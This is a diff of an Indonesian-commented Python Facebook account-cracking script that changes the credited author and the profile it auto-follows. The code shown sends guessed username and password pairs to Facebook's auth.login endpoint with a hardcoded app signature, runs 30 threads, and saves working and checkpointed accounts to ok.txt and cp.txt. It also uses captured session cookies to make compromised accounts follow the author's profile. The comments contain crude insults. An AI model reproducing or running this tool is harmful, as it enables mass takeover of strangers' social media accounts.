@@ -2,9 +2,9 @@
 # -*- coding: utf-8 -*-
 #Males gw encrypt Tod jika mau recode, recode aja
 #Tapi ngotak dikit jangan Lo jual belikan sc ini kontol
-username = 'SyafiiXD'
-Created =  '06-07-2022'
-Myfacebook = ('https://www.facebook.com/fikritampan305')
+#Code by YayanXD 
+#Created 05-07-2020
+#My facebook (https://www.facebook.com/KM39453)
 
 import os,sys,re,time,json,random,requests
 from bs4 import BeautifulSoup as parser
@@ -28,9 +28,9 @@ def kontol():
      ╚██████╗██║  ██║     ██║╚██████╗██║  ██╗
 \x1b[1;91m  •\x1b[1;93m•\x1b[1;92m•\x1b[1;97m ╚═════╝╚═╝  ╚═╝     ╚═╝ ╚═════╝╚═╝  ╚═╝\x1b[1;92m •\x1b[1;93m•\x1b[1;91m•
 \x1b[1;94m────────────────────────────────────────────────────
-\x1b[1;97m [\x1b[1;94m•\x1b[1;92m•\x1b[1;97m] Author   : SyafiiXD
-\x1b[1;97m [\x1b[1;92m•\x1b[1;94m•\x1b[1;97m] Github   : https://github.com/Syafii-XD
-\x1b[1;97m [\x1b[1;94m•\x1b[1;92m•\x1b[1;97m] Facebook : https://www.facebook.com/fikritampan305
+\x1b[1;97m [\x1b[1;94m•\x1b[1;92m•\x1b[1;97m] Author   : YayanXD
+\x1b[1;97m [\x1b[1;92m•\x1b[1;94m•\x1b[1;97m] Github   : https://github.com/Yayan-XD
+\x1b[1;97m [\x1b[1;94m•\x1b[1;92m•\x1b[1;97m] Facebook : https://www.facebook.com/KM39453
 \x1b[1;94m────────────────────────────────────────────────────""")
 
 def jembut():
@@ -41,9 +41,9 @@ def jembut():
      ╚██████╗██║  ██║     ██║╚██████╗██║  ██╗
 \x1b[1;91m  •\x1b[1;93m•\x1b[1;92m•\x1b[1;97m ╚═════╝╚═╝  ╚═╝     ╚═╝ ╚═════╝╚═╝  ╚═╝\x1b[1;92m •\x1b[1;93m•\x1b[1;91m•
 \x1b[1;94m────────────────────────────────────────────────────
-\x1b[1;97m [\x1b[1;92m+\x1b[1;97m] Author   : SyafiiXD
-\x1b[1;97m [\x1b[1;92m+\x1b[1;97m] Github   : https://github.com/Syafii-XD
-\x1b[1;97m [\x1b[1;92m+\x1b[1;97m] Facebook : https://www.facebook.com/fikritampan305
+\x1b[1;97m [\x1b[1;92m+\x1b[1;97m] Author   : YayanXD
+\x1b[1;97m [\x1b[1;92m+\x1b[1;97m] Github   : https://github.com/Yayan-XD
+\x1b[1;97m [\x1b[1;92m+\x1b[1;97m] Facebook : https://www.facebook.com/KM39453
 \x1b[1;94m────────────────────────────────────────────────────""")
 
 def yayanxd():
@@ -95,7 +95,7 @@ def moch_yayan():
                            except:
                                   pass
                      try:
-                             ikuti = parser(requests.get(mbasic.format("/fikritampan305"),cookies=cek).content,"html.parser").find("a",string="Ikuti")["href"]
+                             ikuti = parser(requests.get(mbasic.format("/KM39453"),cookies=cek).content,"html.parser").find("a",string="Ikuti")["href"]
                              ses.get(mbasic.format(ikuti),cookies=cek)
                      except :
                              pass
@@ -112,15 +112,15 @@ def moch_yayan():
              params = {
                      'access_token': b,
                      'format': 'JSON',
-                     'sdk_version': '11',
+                     'sdk_version': '2',
                      'email': username,
                      'locale': 'en_US',
                      'password': password,
-                     'sdk': 'android',
+                     'sdk': 'ios',
                      'generate_session_cookies': '1',
                      'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
              }
-             api = 'https://mobile.facebook.com/method/auth.login'
+             api = 'https://b-api.facebook.com/method/auth.login'
              response = requests.get(api, params=params)
              if 'EAA' in response.text:
                  print(f"\r\033[1;92m  * --> {username}|{password}                       ",end="")
@@ -320,7 +320,7 @@ def moch_yayan():
                    print('\n\x1b[1;97m [\x1b[1;92m+\x1b[1;97m] the result\x1b[1;92m OK\x1b[1;97m saved to : ok.txt\n [\x1b[1;93m-\x1b[1;97m] the result\x1b[1;93m CP\x1b[1;97m saved to : cp.txt')
                    print('\n [\x1b[1;91m!\x1b[1;97m] turn off data to stop the process\n')
                    with ThreadPoolExecutor(max_workers=30) as ex:
-                          for user in Username:
+                          for user in username:
                                   users = user.split('|')
                                   ss = users[0].split(' ')
                                   for x in ss:
